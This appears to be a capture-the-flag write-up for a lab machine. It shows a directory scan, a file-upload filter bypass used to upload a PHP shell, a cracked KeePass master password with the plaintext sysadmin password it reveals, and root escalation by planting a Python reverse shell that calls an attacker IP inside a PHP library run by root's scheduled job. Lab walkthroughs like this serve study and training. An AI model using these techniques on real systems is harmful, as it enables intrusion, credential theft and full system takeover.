
First gobuster scan:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/EXPLOITS/linux/pwdfeedback/sudo-cve-2019-18634]                                 
└──╼ #gobuster dir -u 10.10.156.46 -w /usr/share/wordlists/dirb/big.txt                                                
===============================================================
Gobuster v3.1.0                                            
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                         
===============================================================
[+] Url:                     http://10.10.156.46                                                                       
[+] Method:                  GET                                                                                       
[+] Threads:                 10                                                                                        
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt                                                         
[+] Negative Status codes:   404                                                                                       
[+] User Agent:              gobuster/3.1.0                                                                                                                                                                                                   
[+] Timeout:                 10s                                                                                       
===============================================================                                                        
2023/04/07 20:06:28 Starting gobuster in directory enumeration mode                                                    
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.156.46/cloud/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.156.46/css/]  
/server-status        (Status: 403) [Size: 277]                                                                                 
===============================================================
2023/04/07 20:07:22 Finished
===============================================================
```

`/cloud` brought us to an upload page for images. Because there is a file upload filter, we have to bypass it.
Working payload for shell upload:
```
http://10.8.1.167:8000/shell.php .png
```

Found keepass file in `/opt`:
```
www-data@opacity:/tmp$ ls -la /opt
total 12
drwxr-xr-x  2 root     root     4096 Jul 26  2022 .
drwxr-xr-x 19 root     root     4096 Jul 26  2022 ..
-rwxrwxr-x  1 sysadmin sysadmin 1566 Jul  8  2022 dataset.kdbx
```
This is a keepass vault, which we have read-access to. We download this to the local machine.

Keepass `.kdbx` files have a hash with the master password for the vault inside, which you can extract using `keepass2john`.
```
┌─[root@edu-virtualbox]─[/tmp]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt john 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)
1g 0:00:00:12 DONE (2023-04-07 22:48) 0.08084g/s 70.49p/s 70.49c/s 70.49C/s chichi..walter
Use the "--show" option to display all of the cracked passwords reliably
```

Found credentials inside of keepass file:
```
kpcli:/> open dataset.kdbx 
Please provide the master password: *************************
kpcli:/> ls
=== Groups ===
Root/
kpcli:/> cd Root/
kpcli:/Root> ls
=== Entries ===
0. user:password                                                          
kpcli:/Root> ls -la
kpcli:/Root> ls
=== Entries ===
0. user:password                                                          
kpcli:/Root> show 0

Title: user:password
Uname: sysadmin
 Pass: Cl0udP4ss40p4city#8700
  URL: 
Notes: 
```

Root runs `/home/sysadmin/scripts/script.php` every few minutes. this binary makes a backup, and it imports `/home/sysadmin/scripts/lib/backup.inc.php`
```
sysadmin@opacity:~/scripts$ cat script.php   
<?php                                                                   
//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;
//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```
`script.php` is a file owned by root, in a folder owned by root, so it cannot be changed.
`/home/sysadmin/scripts/lib` however, is owned by `sysadmin`. This means we can use
```
mv lib/backup.inc.php lib/backup.inc.php.bak
cp lib/backup.inc.php.bak lib/backup.inc.php
```
for write-rights to the file.
After that, use the `exec()` function to run a reverse shell in the library called upon: 
```
sysadmin@opacity:~/scripts$ cat lib/backup.inc.php
<?php
ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');
function zipData($source, $destination) {
        exec('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.1.167",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;;pty.spawn("/bin/bash")\'');
        if (extension_loaded('zip')) {
                if (file_exists($source)) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
                                $source = realpath($source);
                                if (is_dir($source)) {
                                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                                        foreach ($files as $file) {
                                                $file = realpath($file);
                                                if (is_dir($file)) {
                                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                                } else if (is_file($file)) {
                                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                                                }
                                        }
                                } else if (is_file($source)) {
                                        $zip->addFromString(basename($source), file_get_contents($source));
                                }
                        }
                        return $zip->close();
                }
        }
        return false;
}
?>
```
Listen using `netcat` on the specified port, and you've got root.